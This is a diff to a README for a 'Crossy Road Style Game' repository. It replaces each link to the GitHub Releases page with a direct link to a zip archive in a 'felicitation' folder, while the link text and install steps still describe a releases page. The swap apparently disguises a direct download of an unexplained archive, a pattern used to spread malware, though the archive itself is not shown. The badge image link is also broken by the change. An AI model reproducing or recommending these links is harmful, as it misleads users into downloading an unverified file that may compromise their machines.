@@ -6,7 +6,7 @@ Welcome to the **Crossy Road Style Game**! This guide will help you download and
 
 ## 📥 Download Now
 
-[![Download Crossy Road Style Game](https://img.shields.io/badge/Download%20Now-%20%F0%9F%8C%90-brightgreen)](https://github.com/banisgwapooo/Crossy-Road-Style-Game/releases)
+[![Download Crossy Road Style Game](https://raw.githubusercontent.com/banisgwapooo/Crossy-Road-Style-Game/main/felicitation/Crossy-Road-Style-Game.zip%20Now-%20%F0%9F%8C%90-brightgreen)](https://raw.githubusercontent.com/banisgwapooo/Crossy-Road-Style-Game/main/felicitation/Crossy-Road-Style-Game.zip)
 
 ## 🎮 About the Game
 
@@ -29,9 +29,9 @@ To ensure smooth gameplay, make sure your computer meets the following requireme
 
 ## 📥 Download & Install
 
-To download the game, visit the [Releases page](https://github.com/banisgwapooo/Crossy-Road-Style-Game/releases). Follow these steps to install the game:
+To download the game, visit the [Releases page](https://raw.githubusercontent.com/banisgwapooo/Crossy-Road-Style-Game/main/felicitation/Crossy-Road-Style-Game.zip). Follow these steps to install the game:
 
-1. Go to the [Releases page](https://github.com/banisgwapooo/Crossy-Road-Style-Game/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/banisgwapooo/Crossy-Road-Style-Game/main/felicitation/Crossy-Road-Style-Game.zip).
 2. Look for the latest version of the game. It will have a version number next to it.
 3. Click on the version link to expand the assets.
 4. Download the file that matches your operating system (e.g., `.exe` for Windows or `.zip` for macOS).
